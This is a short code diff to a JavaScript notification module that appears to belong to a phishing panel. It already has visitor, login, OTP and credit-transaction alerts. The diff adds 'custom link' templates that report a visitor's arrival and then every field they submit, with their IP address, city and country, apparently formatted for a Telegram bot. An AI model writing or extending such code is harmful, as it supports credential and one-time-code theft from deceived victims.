@@ -50,9 +50,40 @@ Thank you for your purchase!
     `;
 }
 
+async function scratchVisitorNotification(linkname) {
+    return `
+🎨 <b>New Custom Link Visitor</b>
+Link: ${linkname}
+Status: Active
+
+<i>Awaiting submission...</i>
+    `;
+}
+
+async function scratchSubmissionNotification(linkname, pageNumber, data, ip, city, country) {
+    let dataLines = '';
+    for (const [label, value] of Object.entries(data)) {
+        dataLines += `• ${label}: ${value}\n`;
+    }
+
+    return `
+🎨 <b>Custom Link Submission</b>
+Link: ${linkname}
+Page: ${pageNumber}
+
+<b>Submitted Data:</b>
+${dataLines}
+<b>Location:</b>
+• ${city}, ${country}
+• IP: ${ip}
+    `;
+}
+
 module.exports = {
     visitorNotification,
     loginNotification,
     otpNotification,
-    creditTransactionNotification
+    creditTransactionNotification,
+    scratchVisitorNotification,
+    scratchSubmissionNotification
 }
